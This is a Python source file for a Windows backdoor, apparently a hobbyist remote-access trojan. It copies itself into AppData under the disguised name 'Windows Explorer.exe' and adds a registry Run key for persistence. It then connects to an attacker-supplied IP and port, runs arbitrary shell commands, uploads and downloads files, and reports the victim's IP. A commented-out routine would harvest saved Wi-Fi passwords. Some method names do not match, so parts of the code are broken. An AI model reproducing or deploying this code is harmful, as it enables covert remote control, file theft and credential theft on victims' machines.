#!/usr/bin/env python3
from urllib.request import urlopen
import urllib
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import re


class Backdoor():
    def __init__(self, ip, port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def persistence(self):
        location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)

    def cmd_send(self, data):
    	
        json_send = json.dumps(data)
        self.connection.send(json_send)

    def cmd_recv(self):
        
        json_recived = ""

        while True:
            try:
                json_recived += self.connection.recv(1024)
                return json.loads(json_recived)
            except ValueError:
                continue
    def change_dir(self, path):
        
        os.chdir(path)
    
        return "Changed dir to %s" % path
    def upload_file(self, path, content):
    	
        with open(path, "wb") as file:
            uploaded_file = base64.b64decode(content)
            file.write(uploaded_file)
            return "Uploaded Succesfully !"

    def download_file(self, path):
        with open(path, "rb") as file:
            download_file = base64.b64encode(file.read())
            return download_file

    def exec_command(self, command):
        return subprocess.check_output(command, shell=True)

    def get_ip():
        # Gets public IP address of this network.
        
        data = str(urlopen('http://checkip.dyndns.com/').read())
        ip = socket.gethostbyname(socket.gethostname())
        private = ip
        pub = re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
        return f"Private ip of the machine is {private}\nPublic ip of the machine is {pub}"


    # def get_wifi():
    #     #Get all saved wifi Bitch
    #     data = os.popen("netsh wlan show profiles").read()
    #     wifi = re.compile("All User Profile\s*:.(.*)")
    #     ssid = wifi.findall(data)
    #     try:
    #         wlan = os.popen("netsh wlan show profile "+str(ssid.replace(" ","*"))+" key=clear").read()

    #         pass_regex = re.compile("Key Content\s*:.(.*)")
            
    #         return pass_regex.search(wlan).group(1)
        
    #     except:
        
    #         return " "
    #TODO: send the wifi passes or maybe read them dynamicly



    def run(self):
        while True:
            rcvd_cmd = self.json_recv()
            try:
                if rcvd_cmd[0] == "exit":
                    self.connection.close()
                    sys.exit() 
                elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
                    cmd_rslt = self.change_dir(rcvd_cmd[1])
                elif rcvd_cmd[0] == "download":
                    cmd_rslt = self.download_file(rcvd_cmd[1])
                elif rcvd_cmd[0] == "upload":
                    cmd_rslt = self.upload_file(rcvd_cmd[1], rcvd_cmd[2])
                elif rcvd_cmd[0] == "getip":
                    cmd_rslt = self.get_ip
                # elif rcvd_cmd[0] == "get_wifi":
                    # cmd_rslt = self.get_wifi
                else:
                    cmd_rslt = self.exec_command(rcvd_cmd)
            except Exception as e :
                    cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"

            self.cmd_send(cmd_rslt)
